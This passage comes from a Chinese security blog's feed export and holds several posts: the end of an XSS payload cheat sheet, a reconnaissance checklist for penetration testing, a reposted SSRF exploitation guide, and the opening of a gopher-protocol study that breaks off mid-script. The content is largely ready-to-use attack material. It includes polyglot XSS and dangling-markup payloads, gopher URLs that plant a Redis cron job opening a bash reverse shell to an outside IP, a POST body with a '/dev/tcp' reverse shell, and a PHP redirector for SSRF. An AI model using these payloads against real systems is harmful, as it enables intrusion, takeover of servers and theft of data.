name=&quot;</code></pre><p>使用object窗口名称从页面传递数据</p><pre><code>&lt;object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;</code></pre><p>使用frameset窗口名称从页面传递数据</p><pre><code>&lt;frameset&gt;&lt;frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;</code></pre><h4 id="多语言有效载荷"><a href="#多语言有效载荷" class="headerlink" title="多语言有效载荷"></a>多语言有效载荷</h4><p>多语言有效载荷1</p><pre><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;&gt;</code></pre><p>多语言有效载荷2</p><pre><code>javascript:&quot;/*&#39;/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \&quot; onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;</code></pre><h4 id="经典向量（XSS加密）"><a href="#经典向量（XSS加密）" class="headerlink" title="经典向量（XSS加密）"></a>经典向量（XSS加密）</h4><p>具有JavaScript协议的Image src</p><pre><code>&lt;img src=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>带有JavaScript协议的正文背景</p><pre><code>&lt;body background=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>随着现代浏览器使用空来源，iframe数据网址不再起作用</p><pre><code>&lt;iframe src=&quot;data:text/html,&lt;img src=1 onerror=alert(document.domain)&gt;&quot;&gt;</code></pre><p>用于IE的VBScript协议</p><pre><code>&lt;a href=&quot;vbscript:MsgBox+1&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;#&quot; onclick=&quot;vbs:Msgbox+1&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;#&quot; onclick=&quot;VBS:Msgbox+1&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;#&quot; onclick=&quot;vbscript:Msgbox+1&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;#&quot; onclick=&quot;VBSCRIPT:Msgbox+1&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;#&quot; language=vbs onclick=&quot;vbscript:Msgbox+1&quot;&gt;XSS&lt;/a&gt;</code></pre><p>JScript compact是JS的最小版本，未在IE中广泛使用</p><pre><code>&lt;a href=&quot;#&quot; onclick=&quot;jscript.compact:alert(1);&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;#&quot; onclick=&quot;JSCRIPT.COMPACT:alert(1);&quot;&gt;test&lt;/a&gt;</code></pre><p>JScript.Encode允许编码的JavaScript</p><pre><code>&lt;a href=# language=&quot;JScript.Encode&quot; onclick=&quot;#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;&gt;XSS&lt;/a&gt;&lt;a href=# onclick=&quot;JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;&gt;XSS&lt;/a&gt;</code></pre><p>VBScript.Encoded允许编码的VBScript</p><pre><code>&lt;iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@&gt;&lt;iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@&gt;</code></pre><p>用于Netscape Navigator的JavaScript实体</p><pre><code>&lt;a title=&quot;&amp;{alert(1)}&quot;&gt;XSS&lt;/a&gt;</code></pre><p>Netscape Navigator曾经支持JavaScript样式表</p><pre><code>&lt;link href=&quot;xss.js&quot; rel=stylesheet type=&quot;text/javascript&quot;&gt;</code></pre><p>用于消耗标记的按钮</p><pre><code>&lt;form&gt;&lt;button name=x formaction=x&gt;&lt;b&gt;stealme</code></pre><p>IE9选择元素和纯文本用于消耗标记</p><pre><code>&lt;form action=x&gt;&lt;button&gt;XSS&lt;/button&gt;&lt;select name=x&gt;&lt;option&gt;&lt;plaintext&gt;&lt;script&gt;token=&quot;supersecret&quot;&lt;/script&gt;</code></pre><p>仅限XBL Firefox &lt;= 2</p><pre><code>&lt;div style=&quot;-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)&quot;&gt;&lt;div style=&quot;\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)&quot;&gt;&lt;div style=&quot;-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)&quot;&gt;&lt;div style=&quot;-moz-bindin&amp;#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)&quot;&gt;</code></pre><p>XBL也使用数据URL在FF3.5中工作</p><pre><code>&lt;img src=&quot;blah&quot; style=&quot;-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)&quot; /&gt;</code></pre><p>CSS表达式&lt;= IE7</p><pre><code>&lt;div style=xss:expression(alert(1))&gt;&lt;div style=xss:expression(1)-alert(1)&gt;&lt;div style=xss:expressio\6e(alert(1))&gt;&lt;div style=xss:expressio\006e(alert(1))&gt;&lt;div style=xss:expressio\00006e(alert(1))&gt;&lt;div style=xss:expressio\6e(alert(1))&gt;&lt;div style=xss:expressio&amp;#x5c;6e(alert(1))&gt;</code></pre><p>在怪癖模式下，IE允许您使用=代替：</p><pre><code>&lt;div style=xss=expression(alert(1))&gt;&lt;div style=&quot;color&amp;#x3dred&quot;&gt;test&lt;/div&gt;</code></pre><p>IE较旧模式的行为</p><pre><code>&lt;a style=&quot;behavior:url(#default#AnchorClick);&quot; folder=&quot;javascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>IE中较旧版本的函数中支持的事件处理程序</p><pre><code>&lt;script&gt;function window.onload(){alert(1);}&lt;/script&gt;&lt;script&gt;function window::onload(){alert(1);}&lt;/script&gt;&lt;script&gt;function window.location(){}&lt;/script&gt;&lt;body&gt;&lt;script&gt;function/*&lt;img src=1 onerror=alert(1)&gt;*/document.body.innerHTML(){}&lt;/script&gt;&lt;/body&gt;&lt;body&gt;&lt;script&gt;function document.body.innerHTML(){ x = &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;; }&lt;/script&gt;&lt;/body&gt;</code></pre><p>GreyMagic HTML + time漏洞利用（即使在5 docmode下也不再起作用）</p><pre><code>&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;img src=1 onerror=alert(1)&gt;&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/4067#toc-27" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-27</a><br><a href="https://juejin.im/post/5bac9e21f265da0afe62ec1b" target="_blank" rel="noopener">https://juejin.im/post/5bac9e21f265da0afe62ec1b</a><br><a href="https://zhuanlan.zhihu.com/p/61773197" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/61773197</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904601&amp;idx=1&amp;sn=3c8fd18363ddb3b7b6b5f33565696186&amp;chksm=8b55c1c4bc2248d2c2b935b3980652ce576f4d532e63ca4c72f9a7a4cbafb2c9e6a62abca620&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1576462865354&amp;sharer_shareid=9aaf420661f2f9968b23fa8064773d63#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904601&amp;idx=1&amp;sn=3c8fd18363ddb3b7b6b5f33565696186&amp;chksm=8b55c1c4bc2248d2c2b935b3980652ce576f4d532e63ca4c72f9a7a4cbafb2c9e6a62abca620&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1576462865354&amp;sharer_shareid=9aaf420661f2f9968b23fa8064773d63#rd</a><br><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/xss-collect.html</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集</title>
      <link href="/186766472.html"/>
      <url>/186766472.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>稍微总结整理了下，当备忘录了，后期可能会继续更新</p><h2 id="信息搜集流程"><a href="#信息搜集流程" class="headerlink" title="信息搜集流程"></a>信息搜集流程</h2><blockquote><p>拿到一个网站首先进行：whois、子域名、备案信息；<br>利用获取到的子域名批量获取服务器信息：真实ip、端口服务、dns信息务；<br>然后是web层方面：网站架构、信息泄露、探测waf、旁站和C端、网络空间<br>整理后查找脆弱点进行渗透</p></blockquote><h2 id="信息搜集方法"><a href="#信息搜集方法" class="headerlink" title="信息搜集方法"></a>信息搜集方法</h2><h3 id="0x01-Whois"><a href="#0x01-Whois" class="headerlink" title="0x01 Whois"></a>0x01 Whois</h3><ol><li><a href="https://whois.chinaz.com/" target="_blank" rel="noopener">https://whois.chinaz.com/</a> //站长</li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> //微步</li><li><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a> //爱站</li><li>kali 也可通过whois命令进行查询<h3 id="0x02-备案查询"><a href="#0x02-备案查询" class="headerlink" title="0x02 备案查询"></a>0x02 备案查询</h3></li><li><a href="http://www.beian.gov.cn/portal/recordQuery/" target="_blank" rel="noopener">http://www.beian.gov.cn/portal/recordQuery/</a> //公安备案查询</li><li><a href="http://beianbeian.com/" target="_blank" rel="noopener">http://beianbeian.com/</a></li><li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a> //天眼查</li><li><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a> //企业信用公示<h3 id="0x03-子域名"><a href="#0x03-子域名" class="headerlink" title="0x03 子域名"></a>0x03 子域名</h3></li><li>layer子域名挖掘机</li><li><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li><li>subDomainsBrute</li><li>搜索引擎语法(site:xxx.com)<h3 id="0x04-DNS"><a href="#0x04-DNS" class="headerlink" title="0x04 DNS"></a>0x04 DNS</h3></li><li>Kali（host、dig命令）</li><li>windows（nslookup命令）</li><li>在线工具（<a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a> //站长）<h3 id="0x05-真实IP"><a href="#0x05-真实IP" class="headerlink" title="0x05 真实IP"></a>0x05 真实IP</h3>很多的网站都挂有CDN加速，获取到的IP不一定是真实IP，如果搜索出来的IP直接访问返回错误，一般就不是真实IP</li></ol><blockquote><p>CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。</p></blockquote><p>获取真实IP 思路</p><blockquote><p>1、二级域名法 一般网站不会所有的二级域名放CDN，因此我们可以利用这点来获取网站的真实ip </p><p> 2、<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">多地ping法</a> 由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN</p><p> 3、nslookup法 找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP </p><p>4、查看邮件法 通过查看邮件原文来确定ip地址，CDN总不会发送邮件吧</p><p>5、RSS订阅法 RSS原理于邮件法差不多</p><p>6、<a href="https://toolbar.netcraft.com/site_report" target="_blank" rel="noopener">查看历史解析记录法</a> 查找域名历史解析记录，域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址</p><p>7、利用网站漏洞（XSS、命令执行、SSRF、php探针、phpinfo页面等） 可以通过一些页面和漏洞获取到服务器ip地址也是可能的。</p></blockquote><h3 id="0x06-敏感目录和敏感信息"><a href="#0x06-敏感目录和敏感信息" class="headerlink" title="0x06 敏感目录和敏感信息"></a>0x06 敏感目录和敏感信息</h3><ol><li>目录工具（御剑、dirsearch，kali的dirb）</li><li>wpscan（kali扫描wordpress漏洞）</li><li>BBscan （批量扫描信息泄露工具）</li><li>GSIL（GitHub敏感信息泄露监控工具）</li><li>搜索引擎语法（<a href="http://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">www.exploit-db.com/google-hacking-database/</a> //Google Hacking Database）</li><li>同时也可以通过其他社交平台，侧面收集目标的敏感信息</li></ol><h3 id="0x07-网站架构（操作系统、CMS、中间件、数据库、编程语言）"><a href="#0x07-网站架构（操作系统、CMS、中间件、数据库、编程语言）" class="headerlink" title="0x07 网站架构（操作系统、CMS、中间件、数据库、编程语言）"></a>0x07 网站架构（操作系统、CMS、中间件、数据库、编程语言）</h3><ol><li>Nmap、masscan</li><li>wappalyzer插件</li><li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉</a></li><li>CMS查询工具（御剑cms 、大禹cms、kali的whatweb）</li><li><a href="http://tool.chinaz.com/port" target="_blank" rel="noopener">站长端口在线查询</a> //仅限单个端口扫描（不留痕迹）</li></ol><p>PS：netstat -anbo（window查看开放端口及对应进程，a查看所有连接和侦听端口，n以数字方式显示地址和端口号，b显示端口连接的程序，o显示关联id）需要权限</p><h3 id="旁站和C段"><a href="#旁站和C段" class="headerlink" title="旁站和C段"></a>旁站和C段</h3><ol><li>nmap</li><li>北极熊扫描器</li><li><a href="http://stool.chinaz.com/same" target="_blank" rel="noopener">站长</a></li><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">在线C段旁站查询</a></li></ol><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><ol><li>nmap (–script=http-waf-detect、–script=http-waf-fingerprint)<blockquote><p>http-waf-detect ，它发送很多恶意请求，看有没有被服务端封杀、过滤或检测到的请求。 http-waf-fingerprint 也是这个工作流程，但是这个脚本还会进一步解析响应，根据不同 IDSs 和 WAFs 的模式来对 WAF 进行分类</p></blockquote></li><li>wafw00f</li><li>sqlmap –identify-waf</li><li>手工探测</li></ol><h3 id="网络空间"><a href="#网络空间" class="headerlink" title="网络空间"></a>网络空间</h3><ol><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a></li><li><a href="https://fofa.so/" target="_blank" rel="noopener">FOFA</a></li><li><a href="https://www.zoomeye.org/statistics" target="_blank" rel="noopener">Zoomeye</a></li></ol><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><h4 id="谷歌基本语法"><a href="#谷歌基本语法" class="headerlink" title="谷歌基本语法"></a>谷歌基本语法</h4><blockquote><p>cache //缓存搜索（快照）<br>AND //你懂的<br>“”  //双引号表示强制搜索</p><ul><li>//表示搜索不包含关键词的网页<br>|     //或者的意思<br>site //返回所有于这个域名有关的网页<br>intext //搜索到的网页正文部分包含关键词<br>intitle //搜索到的网页标题包含关键词<br>cache   //搜索关于某些内容的缓存<br>definne //搜索某个词语的定义<br>filetype //搜索指定的文件类型<br>info //查找指定站点的一些基本信息<br>inurl //搜索包含关键词的URL<br>link //可以返回所有和baidu.com做了链接的URL</li></ul></blockquote><h4 id="操作系统判断"><a href="#操作系统判断" class="headerlink" title="操作系统判断"></a>操作系统判断</h4><p>window大小写不敏感，linux大小写敏感</p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞研究[转载]</title>
      <link href="/2133607805.html"/>
      <url>/2133607805.html</url>
      
        <content type="html"><![CDATA[<h1 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h1><p>本文转载自：<img src="https://github.com/xinali/articles/issues/16" alt></p><p>感觉这个师傅的很多细节是自己没有涉及的，转载保存一下。</p><h1 id="SSRF-利用"><a href="#SSRF-利用" class="headerlink" title="SSRF 利用"></a><code>SSRF 利用</code></h1><p>SSRF目前我所见过的主要攻击本地服务器主要有两种方式一个是利用redis，另一种是利用Memcached<br>进行SSRF攻击，利用最多的库就是<code>libcurl</code>，比如php中的<code>curl_exec</code>，<code>curl</code>命令行等，可以先具体看看curl在SSRF中的作用。</p><h2 id="SSRF-客户端主要利用方式"><a href="#SSRF-客户端主要利用方式" class="headerlink" title="SSRF 客户端主要利用方式"></a><code>SSRF 客户端主要利用方式</code></h2><h3 id="curl支持的协议"><a href="#curl支持的协议" class="headerlink" title="curl支持的协议"></a><code>curl支持的协议</code></h3><p>查看<code>curl</code>支持的协议</p><pre><code># curl -VProtocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp </code></pre><p>我们通过使用curl的几个协议可以知道，入侵主机的一些程序信息</p><ol><li>dict</li></ol><pre><code>attacker.com $ curl &#39;dict://victim.com:2323&#39;victim.com   $ nc -lvvp 2323 Listening on [0.0.0.0] (family 0, port 2323)                               Connection from xxx 33442 received!  CLIENT libcurl 7.47.0</code></pre><ol><li>sftp</li></ol><pre><code>attacker.com $ curl &#39;dict://victim.com:2323&#39;evil.com     $ nc -v -l 11111Listening on [0.0.0.0] (family 0, port 11111)Connection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)CLIENT libcurl 7.40.0QUIT</code></pre><blockquote><p>大部分的libcurl都不支持sftp协议，需要经过编译才能支持，所以一般这种探测都不会成功。不支持可以表现 在两个方面，一种是客户端的curl不支持发送sftp协议的数据，另一方面服务器端没有办法利用ssrf进行sftp的请求或接受该协议数据。</p></blockquote><ol><li>gopher<br>gopher协议最简单的请求： gopher://127.0.0.1:2333/_test<br>gopher可以向任何端口发送任意形式的请求，例如http的post包：</li></ol><pre><code>gopher://test.com/_POST /exp.php HTTP/1.1%0d%0aHost: test.com_ip%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null</code></pre><p>比如我们利用gopher发送符合redis协议的数据包，攻击本地的redis，首先产生redis数据协议，可以利用下面的脚本产生需要的redis协议数据，只要每个数据用<code>%0d%0a</code>分割即可</p><pre><code>#!/bin/bash## License: MIT# Author: Michael Weibel#gen_redis_protocol() {    cmd=$1    proto=&quot;&quot;    proto+=&quot;*&quot;    number_of_words=0    byword=&quot;&quot;    for word in $cmd    do        number_of_words=$[number_of_words+1]        byword+=&quot;$&quot;        byword+=${#word}        byword+=&quot;\\r\\n&quot;        byword+=$word        byword+=&quot;\\r\\n&quot;    done    proto+=${number_of_words}    proto+=&quot;\\r\\n&quot;    proto+=${byword}    printf $proto}gen_redis_protocol &quot;SET mykey Hello&quot;</code></pre><p>因为redis是通过<code>\r\n</code>即<code>%0d%0a</code>，来分割每条命令的，所以首先用上面的脚本生成符合redis协议的数据，之后利用<code>%0d%0a</code>合并即可，举个简单的例子</p><pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><p>实际上任何形式的报文都可以发，在下划线之后的内容既是报文内容，要注意url加密问题。<br>其中sftp和dict主要用于获取服务器端<code>libssh</code>和<code>libcurl</code>的版本信息，因为可以利用这两个软件的信息进行漏洞利用，gopher则可以直接进行攻击。</p><blockquote><p>libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237)</p></blockquote><h2 id="SSRF-起源-服务器后端语言"><a href="#SSRF-起源-服务器后端语言" class="headerlink" title="SSRF 起源---服务器后端语言"></a><code>SSRF 起源---服务器后端语言</code></h2><h3 id="SSRF-服务器端-php后端"><a href="#SSRF-服务器端-php后端" class="headerlink" title="SSRF 服务器端--php后端"></a><code>SSRF 服务器端--php后端</code></h3><p>如果利用php写的后端，那么php中可以触发ssrf的函数： <code>file_get_contents()</code>, <code>fsockopen()</code>, <code>curl_exec()</code>, <code>fopen()</code></p><ol><li><code>curl_exec()</code>，可以发送get请求和post请求：<br>curl如果前面不输入协议会自动走http协议， 默认情况下，curl不会跟踪302跳转，并且curl不支持php的伪协议，不用考虑文件包含漏洞。</li></ol><pre><code>$ http --follow --all -h http://172.16.1.4/test_curl_exec.php&lt;?php$curl = curl_init();curl_setopt($curl, CURLOPT_URL, &#39;http://172.16.1.4/302.php&#39;);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, 1);curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); # 设置curl跟踪302跳转$response = curl_exec($curl);var_dump($response);curl_close($curl);?&gt;</code></pre><ol><li><code>file_get_contents</code>只能get访问url，但是默认情况下就支持302跳转</li></ol><pre><code>$ http --follow --all -h http://172.16.1.4/test_curl_exec.php&lt;?php$response = file_get_contents(&quot;http://172.16.1.4/302.php&quot;);var_dump($response);?&gt;</code></pre><p>必须输入协议，比如<code>http://</code>，在<code>php5.6</code>和<code>php7.1.7</code>测试下都不支持gopher。</p><blockquote><p>同样该函数也是LFI(本地文件包含)漏洞需要重点关注的函数</p></blockquote><ol><li>fsockopen需要自己写http报文，几乎不会有人用吧。 Fopen用的也很少，但是它是可以请求一个url的，如果php开启了 fopen 的 gopher wrapper，那么fopen就可以直接发送gopher请求。<br>能够运行的原因就是<code>curl</code>扩展支持<code>dict</code>和<code>file</code>协议，可以利用这些协议对主机进行相关的数据请求。普通的标签，比如<code>img</code>，<code>script</code>等基本都不会支持那么多的协议，就本就要想别的办法。</li></ol><h2 id="SSRF-提供某种服务-redis-memcache"><a href="#SSRF-提供某种服务-redis-memcache" class="headerlink" title="SSRF 提供某种服务--redis/memcache"></a><code>SSRF 提供某种服务--redis/memcache</code></h2><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a><code>redis</code></h3><p>redis支持的通信协议格式</p><pre><code>*&lt;参数数量&gt; CR LF$&lt;参数 1 的字节数量&gt; CR LF&lt;参数 1 的数据&gt; CR LF...$&lt;参数 N 的字节数量&gt; CR LF&lt;参数 N 的数据&gt; CR LF</code></pre><p>具体可以打印出来的是这样的</p><pre><code>*3$3SET$5mykey$7myvalue</code></pre><p>每行数据都是利用<code>\r\n</code>(<code>%0d0a</code>)分割的，只要能够发送这样的数据，redis都照常解析</p><ol><li><code>http</code> 协议<br>正常如果使用<code>http</code>协议请求<code>redis</code>，会出现这样的错误</li></ol><pre><code>$ curl &#39;http://212.24.111.64:6379/%0D%0Ainfo&#39;-ERR wrong number of arguments for &#39;get&#39; command-ERR unknown command &#39;User-Agent:&#39;-ERR unknown command &#39;Host:&#39;-ERR unknown command &#39;Accept:&#39;</code></pre><p>出现这样错误是因为<code>http</code>协议的头数据都是通过<code>\r\n</code>来分割的，redis解析这样的数据，所以就出现了上面的错误。如果想要通过<code>http</code>数据利用redis，那么服务器端进行远程(或本地)请求的函数必须存在<code>CRLF</code>这样<code>http</code>头解析漏洞。</p><ol><li>CRLF漏洞<br>如果目标服务器存在CRLF漏洞，对redis使用http请</li></ol><blockquote><p>我根据数据报文格式和redis的通信协议，猜测redis就是解析tcp数据包，以<code>\r\n</code>即<code>%0D%0A</code>为分割线，分割成各个命令，所以如果存在CRLF漏洞，那么可以直接将命令注入报文中，redis解析之后直接执行命令！<br>比如redis支持<code>dict</code>协议</p></blockquote><pre><code>curl &#39;http://xx:6379/info&#39;curl &#39;http://xx:6379/config set dir /var/www/html&#39;</code></pre><p>ssrf在利用的过程中，经常会遇到某个应用”不支持”某种协议的情况，确切来说不是不支持，而是没有办法直接利用，举个例子，redis没有办法直接用<code>http</code>请求进行相关操作，如果直接用的话，会遇到这样的情况</p><h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a><code>memcache</code></h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><code>参考链接</code></h2><p><a href="http://redisdoc.com/topic/protocol.html" target="_blank" rel="noopener">redis通信协议</a><br><a href="http://106.14.61.185/2016/12/07/ssrf/" target="_blank" rel="noopener">ssrf总结</a></p><p>360识图ssrf：<a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0229611" target="_blank" rel="noopener">http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0229611</a><br>远程服务器脚本：</p><pre><code>&lt;?php$ip = $_GET[&#39;ip&#39;];$port = $_GET[&#39;port&#39;];$scheme = $_GET[&#39;s&#39;];$data = $_GET[&#39;data&#39;];header(&quot;Location: $scheme://$ip:$port/$data&quot;);?&gt;</code></pre><p>ssrf=&gt; mysql 导致getshell：<a href="https://paper.seebug.org/510/" target="_blank" rel="noopener">https://paper.seebug.org/510/</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gopher协议学习</title>
      <link href="/3983147628.html"/>
      <url>/3983147628.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近看ssrf，看gopher协议，属实强大，不愧为万金油，在这里好好总结学习一下。</p><h2 id="0x02-Gopher基本介绍"><a href="#0x02-Gopher基本介绍" class="headerlink" title="0x02 Gopher基本介绍"></a>0x02 Gopher基本介绍</h2><h3 id="2-1-什么是Gopher？"><a href="#2-1-什么是Gopher？" class="headerlink" title="2.1 什么是Gopher？"></a>2.1 什么是Gopher？</h3><p>Gopher是一个互联网上使用的分布型的文件搜集获取网络协议。再WWW未发明之前，是最主要的信息检索工具，但是随着WWW的出现，Gopher因为结构的不灵活等原因，慢慢退出历史舞台。</p><h3 id="2-2-Gopher协议在各个协议中的限制"><a href="#2-2-Gopher协议在各个协议中的限制" class="headerlink" title="2.2 Gopher协议在各个协议中的限制"></a>2.2 Gopher协议在各个协议中的限制</h3><p><img src="https://pic2.zhimg.com/80/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.png" alt></p><blockquote><p>–wite-curlwrappers：运用curl工具打开url流<br>curl使用curl –version查看版本以及支持的协议</p></blockquote><p>windows中的curl貌似已经不支持gopher协议，可能也是版本问题（本地win10测试），所有测试都基于linux</p><h3 id="2-3-Gopher协议格式"><a href="#2-3-Gopher协议格式" class="headerlink" title="2.3 Gopher协议格式"></a>2.3 Gopher协议格式</h3><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code><br>gopher的默认端口是70<br>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码<br>需要注意的是TCP数据流前必须要有个字符，不一定是_任何字符都可，该字符不会被传输，是一种数据连接格式。</p><h2 id="0x03利用Gopher协议发送请求"><a href="#0x03利用Gopher协议发送请求" class="headerlink" title="0x03利用Gopher协议发送请求"></a>0x03利用Gopher协议发送请求</h2><p>gopher协议支持发出GET、POST请求，我们可以通过构造我们想要发送的数据包，在构成符合gopher协议的请求后进行发送，实现我们需要进行的操作。可以看出来哈，十分灵活，可以说是ssrf里最强的协议了。</p><p>需要注意的是：</p><blockquote><p>1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>3、在HTTP包的最后要加%0d%0a，代表消息结束</p></blockquote><p>附上一份大佬写的编码脚本：</p><pre><code>#!/usr/bin/python# -*- coding:utf8 -*-import getoptimport sysimport redef togopher():    try:        opts,args = getopt.getopt(sys.argv[1:], &quot;hf:s:&quot;, [&quot;help&quot;, &quot;file=&quot;, &quot;stream=&quot;])    except:        print &quot;&quot;&quot;        Usage: 